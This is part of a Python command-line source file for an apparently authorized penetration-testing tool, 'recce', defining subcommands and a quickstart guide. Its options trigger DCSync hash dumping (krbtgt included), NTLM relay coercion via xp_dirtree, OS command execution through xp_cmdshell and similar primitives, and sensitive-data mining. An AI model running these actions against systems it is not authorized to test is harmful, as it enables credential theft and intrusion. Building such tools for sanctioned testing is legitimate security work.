    bhp.add_argument("--dcsync", action="store_true",
                     help="LIVE: run impacket-secretsdump -just-dc to replicate the "
                          "domain NTLM hashes (incl. krbtgt) - only if the account "
                          "holds replication rights")
    bhp.add_argument("--screenshots", action="store_true",
                     help="save terminal-output proof screenshots of the live "
                          "captures into engagement/screenshots/")
    bhp.add_argument("-o", "--output-dir", default="engagement")
    bhp.add_argument("--title", default="Recce Engagement")
    bhp.set_defaults(func=cmd_bloodhound)

    # MSSQL offensive enumeration + attack chain.
    ms = sub.add_parser("mssql",
                        help="MSSQL: pre-auth probes + (with creds) nxc access/priv "
                             "matrix + MSSQLPwner-style runbook & attack chain")
    ms.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all "
                         "MSSQL hosts in the datastore)")
    ms.add_argument("-u", "--username",
                    help="your account - runs the nxc access/priv check and pre-fills "
                         "every command ('CORP\\alice' / 'alice@corp.local' work too)")
    ms.add_argument("-p", "--password", help="password for your account")
    ms.add_argument("-d", "--domain", help="AD domain (omit + --local-auth for a SQL login)")
    ms.add_argument("--local-auth", action="store_true",
                    help="SQL Server authentication (not Windows/domain)")
    ms.add_argument("--dc-ip", help="DC IP to fill into the generated commands")
    ms.add_argument("--lhost", help="your capture/relay IP for the UNC/relay commands")
    ms.add_argument("--relay", action="store_true",
                    help="actually trigger the SQL service account to authenticate to "
                         "--lhost (xp_dirtree) so your ntlmrelayx catches it")
    ms.add_argument("--data", action="store_true",
                    help="mine the databases: enumerate every table (+ row counts) and "
                         "find columns/tables with sensitive names across all databases")
    ms.add_argument("--perms", action="store_true",
                    help="per-database object-permission mining: guest-enabled databases "
                         "and objects public/guest can access")
    ms.add_argument("--screenshots", action="store_true",
                    help="capture terminal-style PROOF screenshots of executed actions "
                         "(RCE output, write-proof, data mining) for the walkthrough")
    ms.add_argument("--prove-write", action="store_true",
                    help="prove write + permission-modify impact REVERSIBLY (create a "
                         "table, modify a field, toggle a role; everything is reverted)")
    ms.add_argument("--exec", dest="exec_cmd", metavar="CMD",
                    help="execute an OS command on each reachable instance for effect "
                         "and capture the output (needs sysadmin)")
    ms.add_argument("--method", choices=["xp", "ole", "agent", "clr"], default="xp",
                    help="execution primitive for --exec: xp_cmdshell (default), OLE "
                         "Automation, SQL Agent job, or CLR (hands off to mssqlpwner)")
    ms.add_argument("--no-run", action="store_true",
                    help="don't execute nxc/impacket; just write the commands (airgapped-safe)")
    ms.add_argument("--no-probe", action="store_true",
                    help="skip the live SQL Browser / TDS pre-login probes")
    ms.add_argument("--no-links", action="store_true",
                    help="don't recursively walk the linked-server graph")
    ms.add_argument("--link-depth", type=int, default=4, metavar="N",
                    help="max linked-server chain depth to walk (default 4)")
    ms.add_argument("-o", "--output-dir", default="engagement")
    ms.add_argument("--title", default="Recce Engagement")
    ms.set_defaults(func=cmd_mssql)

    # SMB offensive enumeration + attack surface.
    sm = sub.add_parser("smb",
                        help="SMB: stdlib pre-auth posture (dialect/signing/SMBv1) + "
                             "anonymous/credentialed share enum + writable-share proof")
    sm.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all "
                         "SMB hosts in the datastore)")
    sm.add_argument("-u", "--username",
                    help="your account - runs the authenticated enum and pre-fills every "
                         "command ('CORP\\alice' / 'alice@corp.local' work too)")
    sm.add_argument("-p", "--password", help="password for your account")
    sm.add_argument("-d", "--domain", help="AD domain (e.g. corp.local)")
    sm.add_argument("--dc-ip", help="DC IP to fill into the generated commands")
    sm.add_argument("--prove-write", action="store_true",
                    help="prove a writable share REVERSIBLY (drop a marker file, list "
                         "it, delete it) - nothing is left behind")
    sm.add_argument("--screenshots", action="store_true",
                    help="capture terminal-style PROOF screenshots of executed actions "
                         "(share enum, write-proof) for the walkthrough")
    sm.add_argument("--no-run", action="store_true",
                    help="don't execute nxc/smbclient; just write the commands (airgapped-safe)")
    sm.add_argument("--no-probe", action="store_true",
                    help="skip the live SMB2/SMBv1 negotiate probes")
    sm.add_argument("-o", "--output-dir", default="engagement")
    sm.add_argument("--title", default="Recce Engagement")
    sm.set_defaults(func=cmd_smb)

    # FTP offensive enumeration.
    fp = sub.add_parser("ftp",
                        help="FTP: stdlib banner/anonymous/AUTH-TLS probe + known-"
                             "backdoor match + reversible writable-directory proof")
    fp.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all "
                         "FTP hosts in the datastore)")
    fp.add_argument("-u", "--username", help="FTP username (omit to probe anonymous)")
    fp.add_argument("-p", "--password", help="FTP password")
    fp.add_argument("--prove-write", action="store_true",
                    help="prove a writable directory REVERSIBLY (STOR a marker file, "
                         "then DELE it - nothing left behind)")
    fp.add_argument("--screenshots", action="store_true",
                    help="capture terminal-style PROOF screenshots of the write proof")
    fp.add_argument("--no-run", action="store_true",
                    help="don't run the write proof; just write the commands")
    fp.add_argument("--no-probe", action="store_true",
                    help="skip the live banner/anonymous/FEAT probe")
    fp.add_argument("-o", "--output-dir", default="engagement")
    fp.add_argument("--title", default="Recce Engagement")
    fp.set_defaults(func=cmd_ftp)

    # Docker Engine API enumeration.
    dk = sub.add_parser("docker",
                        help="Docker: read the Engine API (2375/2376) unauthenticated "
                             "-> CONFIRMED exposed daemon = remote root RCE on the host")
    dk.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all "
                         "Docker hosts in the datastore)")
    dk.add_argument("--screenshots", action="store_true",
                    help="save a terminal-style `docker info` proof screenshot for "
                         "each exposed daemon")
    dk.add_argument("--no-probe", action="store_true",
                    help="skip the live API read; just write the commands")
    dk.add_argument("-o", "--output-dir", default="engagement")
    dk.add_argument("--title", default="Recce Engagement")
    dk.set_defaults(func=cmd_docker)

    # Kubernetes attack-surface enumeration.
    kp = sub.add_parser("kubernetes", aliases=["k8s"],
                        help="Kubernetes: unauthenticated reads of the kubelet "
                             "(10250/10255), kube-apiserver (6443/8443) and etcd (2379)")
    kp.add_argument("targets", nargs="*",
                    help="restrict to these IPs / ranges / CIDRs / @file (default: all "
                         "Kubernetes hosts in the datastore)")
    kp.add_argument("--no-probe", action="store_true",
                    help="skip the live unauthenticated reads; just write the commands")
    kp.add_argument("-o", "--output-dir", default="engagement")
    kp.add_argument("--title", default="Recce Engagement")
    kp.set_defaults(func=cmd_kubernetes)

    r = sub.add_parser("report", help="regenerate reports (preserves tracking)")
    r.add_argument("-o", "--output-dir", default="engagement")
    r.add_argument("--title", default="Recce Engagement")
    r.set_defaults(func=cmd_report)

    st = sub.add_parser("status", help="print live review coverage")
    st.add_argument("-o", "--output-dir", default="engagement")
    st.set_defaults(func=cmd_status)

    rv = sub.add_parser("review", help="mark items reviewed / not reviewed")
    rv.add_argument("-o", "--output-dir", default="engagement")
    rv.add_argument("--title", default="Recce Engagement")
    rv.add_argument("--host", nargs="*", help="host IP(s) to mark")
    rv.add_argument("--service", nargs="*", metavar="IP:PORT", help="service(s) to mark")
    rv.add_argument("--key", nargs="*", help="raw tracking key(s) to mark")
    rv.add_argument("--cascade", action="store_true",
                    help="with --host, also mark that host's services")
    rv.add_argument("--note", help="attach a note to the marked items")
    rv.add_argument("--undo", action="store_true", help="un-review instead of review")
    rv.set_defaults(func=cmd_review)

    d = sub.add_parser("demo", help="build reports from bundled sample scan (offline)")
    d.add_argument("-o", "--output-dir", default="demo_engagement")
    d.set_defaults(func=cmd_demo)

    doc = sub.add_parser("doctor", help="check this box can run the tool (env + tools + self-scan)")
    doc.add_argument("--no-self-scan", action="store_true",
                     help="skip the real localhost self-scan")
    doc.set_defaults(func=cmd_doctor)
    return p


_QUICKSTART = r"""
recce - phased enumeration & reporting. You mostly need three commands:

  1.  recce doctor                         check this box can run everything
  2.  recce enum   <targets> -o eng        find hosts, ports, services -> workbook
  3.  recce vulns  -o eng                   vuln-scan what enum found

Then open eng/enumeration.xlsx (the "Runbook" tab lists every command + options)
and, when you want more depth, run any of:
      recce db -o eng · privesc -o eng · credenum -u USER -p PASS -d DOMAIN -o eng
      recce writeups -o eng · recce status -o eng

Already have an nmap scan?   recce import scan.xml -o eng   (no scanning)
SharpHound / Certipy data?   recce ad loot.zip certipy.json -u USER -p PASS -d DOMAIN
                             (AD vulns + ESC findings + paths to Domain Admin)
MSSQL servers in scope?      recce mssql -u USER -p PASS -d DOMAIN -o eng
                             (pre-auth probes + access/priv matrix + attack chain)
SMB / file shares?           recce smb -o eng   (signing/SMBv1 posture + share enum;
                             add -u/-p and --prove-write for a reversible write proof)
FTP servers?                 recce ftp -o eng   (anonymous/AUTH-TLS + known backdoors;
                             --prove-write for a reversible writable-dir proof)
Docker API (2375/2376)?      recce docker -o eng   (CONFIRM unauth API = root RCE)
Kubernetes cluster?          recce k8s -o eng   (kubelet / kube-apiserver / etcd)

Targets: a single IP, several IPs, a range (10.0.0.10-40), a CIDR, or @file.
Hosts blocking ping (firewalled / Windows / AD)?  add  -Pn  to enum/scan.
Run scans with sudo for SYN + OS detection.  `recce <command> -h` for options.
"""


def _print_quickstart() -> int:
    print(BANNER)
    print(_QUICKSTART)
    return 0


def main(argv: list[str] | None = None) -> int:
    args = build_arg_parser().parse_args(argv)
    if getattr(args, "command", None) is None:
        # Bare `recce` (no subcommand): a friendly quickstart beats an argparse error.
        return _print_quickstart()
    try:
        return args.func(args)
    except KeyboardInterrupt:
        # A scan phase catches this internally to save partial results; this is the
        # backstop for any command that doesn't, so Ctrl-C is never an ugly crash.
        print("\n[!] Interrupted. Results collected so far were saved; re-run "
              "(with --resume on a scan) to continue.")
        return 130
    except Exception as e:  # noqa: BLE001 - top-level safety net for field use
        # Never dump a raw traceback at a tester mid-engagement. Per-host scan work
        # is already persisted crash-safe, so their data survives; give a clean
        # message and a way to get the details for a bug report.
        print(f"\n[x] recce hit an unexpected error: {type(e).__name__}: {e}")
        if os.environ.get("RECCE_DEBUG"):
            import traceback
            traceback.print_exc()
        else:
            print("    Any data collected so far is saved. Re-run to continue; "
                  "set RECCE_DEBUG=1 to see the full traceback for a bug report.")
        return 1
    finally:
        # Relax the engagement folder to 777 on every exit path (success, Ctrl-C,
        # or crash) so a sudo run never leaves the operator locked out of outputs.
        out_dir = getattr(args, "output_dir", None)
        if out_dir:
            _relax_perms(out_dir)
